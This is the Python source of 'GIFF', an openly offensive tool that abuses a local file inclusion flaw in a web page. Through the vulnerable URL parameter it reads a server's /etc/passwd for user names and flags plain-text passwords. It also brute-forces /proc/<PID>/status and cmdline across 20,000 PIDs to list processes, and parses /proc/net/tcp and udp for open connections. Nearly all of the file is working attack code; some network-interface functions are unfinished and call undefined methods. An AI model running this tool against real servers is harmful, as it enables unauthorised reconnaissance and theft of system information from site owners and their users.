#!/usr/bin/env python
"""
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.


"""
import socket
import struct
import requests
import argparse
import sys
import struct

def hex2dec(s):
    return str(int(s, 16))

def ip2str(ip):
    if len(ip) <= 8:
        r = socket.inet_ntoa(struct.pack('I',socket.htonl(int(ip, 16))))
    else:
        r = socket.inet_ntoa(struct.pack('Q',socket.htonl(int(ip, 16))))
    s = r.split(".")
    s.reverse()
    return ".".join(s)

class InfosFromMachine():

    def __init__(self):
        self.users = {}
        self.ips = {}
        self.processes = {}
        self.encoders = []
        self.method = "get"
        self.url = ""
        self.template = "LFI"
        self.processes = []
        self.ips = []
        self.verbose = False
        
    def ask_for_file(self, method="get", url="", template="LFI", input=""):
        self.method = method
        self.url = url
        self.template = template
        
        if method.lower() == "get":
            if template != "":
                if str(input).find(template) == 0:
                    print(template)
                    print("[-] LFI is not present in your URL: Please, indicate where to inject!")
                    sys.exit()
                u = url.replace(template, str(input))
                r = requests.get(u)
                if len(r.content) > 3 and self.verbose:
                    print(f"-->  {u}")
                return r
            else:
                r = requests.get(url)
                return r
        else:
            # Not supported for now
            return
        
    def get_users(self):
        filename = "/etc/passwd"
        r = self.ask_for_file(self.method, self.url, self.template, filename)
        if r != None:
            data = r.content
            lines = data.splitlines()
            for l in lines:
                columns = l.split(b":")
                if columns[1] != b"x":
                    print("The file /etc/passwd contains plain text passwords!")
                self.users[columns[2]] = columns[0] # we get uid and names
            



    # first, we get /etc/passwd
    # then
    # BF of PID :
    # /proc/1713/status
    def read_executed_process_names(self):
        filename = "/proc/<PID>/status"
        user = ""
        cmd = ""
        name = ""
        for pid in range(0, 20000):
            filename_to_ask = filename.replace("<PID>", str(pid))
            r = self.ask_for_file(self.method, self.url, "LFI", filename_to_ask)
            if r != None:
                data = r.content
                if len(data) < 3:
                    continue
                
                lines = data.splitlines()
                for l in lines:
                    if l.find(b"Name:") != -1:
                        name = l.strip()
                        continue
                    elif l.find(b"Uid:") != -1:
                        uid = l.strip().split(b"\t")[1]
                        user = self.users[uid]
                        continue
                
            
            # /proc/1713/cmdline et remplacer les \x00 par des espaces
            filename = "/proc/<PID>/cmdline"
            filename_to_ask = filename.replace("<PID>", str(pid))
            r = self.ask_for_file(self.method, self.url, "LFI", filename_to_ask)
            if r != None:
                data = r.content
                cmd = b" ".join(data.split(b"\x00")[:-1])
                
            print(f"{filename_to_ask:<30} | {cmd} | {user}")
            self.processes.append((name, uid, user, cmd))

    def read_ipv4_address22(self, interface):
        try:
            with open(f"/sys/class/net/{interface}/address", 'r') as f:
                address = f.read().strip()
            return address
        except FileNotFoundError:
            pass
        return

    def get_MAC_address(self, interface): # TODO
        #interface = "eth0"  # Replace with the name of the interface you are interested in
        
        list_interfaces = ["eth0", "eth1", "eth2", "eth3"]
        for interface in list_interfaces:
            interface_ip = self.read_ipv4_address(interface)
            if interface_ip != None:
                print(f"Interface: {interface}, IP: {read_ipv4_address(interface)}")


        """
    def parse_ipv6_address(self, hex_str):
        address = ":".join(hex_str[i:i+4] for i in range(0, len(hex_str), 4))
        return address

    with open("/proc/net/if_inet6", 'r') as f:
        for line in f:
            fields = line.split()
            ipv6_address = parse_ipv6_address(fields[0])
            netmask = fields[2]
            device = fields[5]

            print(f"Device: {device}, IPv6: {ipv6_address}, Netmask: {netmask}")
        """



    def read_proc_net(self):
        
        #r = ask_for_file(filename=filename)

        #list_ports = ["/proc/net/tcp", "/proc/net/tcp6", "/proc/net/udp", "/proc/net/udp6"]
        list_ports = ["/proc/net/tcp", "/proc/net/udp"]
        for filename_to_ask in list_ports:
            #filename_to_ask = "/proc/net/tcp"
            r = self.ask_for_file(self.method, self.url, "LFI", filename_to_ask)
            if r != None:
                content = r.content.splitlines()
                
                for line in content[1:]:
                    l = line.split(b':')
                    #print(l)
                    l_host = ip2str(l[1].strip())
                    l_port = hex2dec(l[2].split(b" ")[0])
                    
                    r_host = ip2str(l[2].split(b" ")[1])
                    r_port = hex2dec(l[3].split(b" ")[1])
                    
                    print(f"Local IP: {l_host}:{l_port}, Remote IP: {r_host}:{r_port}")
                    self.ips.append((f"{l_host}:{l_port}", f"{r_host}:{r_port}"))

                    
    def main(self):
        
        usage = """
        Get Infos From Files (GIFF)
        Author : Anthony Dessiatnikoff
        
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        $ python3 giff.py -u http://127.0.0.1/page.php?p=LFI --users
        [*] The following URL is targeted : http://127.0.0.1/page.php?p=
        [*] Users found:
        root
        sss
        ddd
        fff
        """
        
        parser = argparse.ArgumentParser(description=usage, formatter_class=argparse.RawTextHelpFormatter)
        parser.add_argument('-u', dest='url', nargs=1, help='the url to use ex: http://domain/page.php?p=LFI')

        parser.add_argument('--users', action="store_true", help='To get users')
        parser.add_argument('--ps', action="store_true", help='To get executed processes')
        parser.add_argument('--ports', action="store_true", help='To get open ports')
        parser.add_argument('--iface', action="store_true", help='To get network interfaces')
        
        parser.add_argument('-v', action="store_true", help='To display requests (verbose)')

        # TODO
        #parser.add_argument('--b64', help='To encode the LFI parameter in base64')
        #parser.add_argument('--delay', help='To add delay between requests')
        #parser.add_argument('--proxy', help='To add a proxy, ex: http://127.0.0.1:8080')
        
        args = parser.parse_args()
        
        url = args.url
        self.verbose = args.v
        
        if url == None:
            print("Error: Need an URL to parse")
            sys.exit()

        self.url = url[0]

        print(f"[*] The following URL is targeted : {self.url}")
        
        if args.users:
            self.get_users()
            print("List of users in remote system:")
            for uid,name in self.users.items():
                print(f"{name.decode()}:{uid.decode()}")
        
        if args.ps:
            self.get_users()
            self.read_executed_process_names()

        if args.ports:
            self.read_proc_net()
        

if __name__ ==  "__main__":

    
    ifm = InfosFromMachine()
    ifm.main()
    sys.exit(0)
